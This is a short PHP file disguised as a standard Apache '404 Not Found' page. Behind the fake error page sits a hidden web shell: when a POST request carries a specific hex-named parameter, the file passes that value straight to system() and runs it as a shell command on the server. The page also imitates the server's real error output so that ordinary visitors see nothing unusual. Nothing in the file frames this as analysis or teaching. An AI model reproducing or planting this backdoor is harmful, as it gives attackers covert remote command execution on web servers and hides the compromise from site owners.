<?php
header("HTTP/1.0 404 Not Found");

if(isset($_POST['8346162efc8f4f3a8eb6dc7ddd7ed631'])){
	system($_POST['8346162efc8f4f3a8eb6dc7ddd7ed631']);
	die;
}

die(
'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL '.$_SERVER[REQUEST_URI].' was not found on this server.</p>
<hr>
<address>'.apache_get_version().' Server at '.$_SERVER[HTTP_HOST].' Port '.$_SERVER[SERVER_PORT].'</address>
</body></html>
'
);
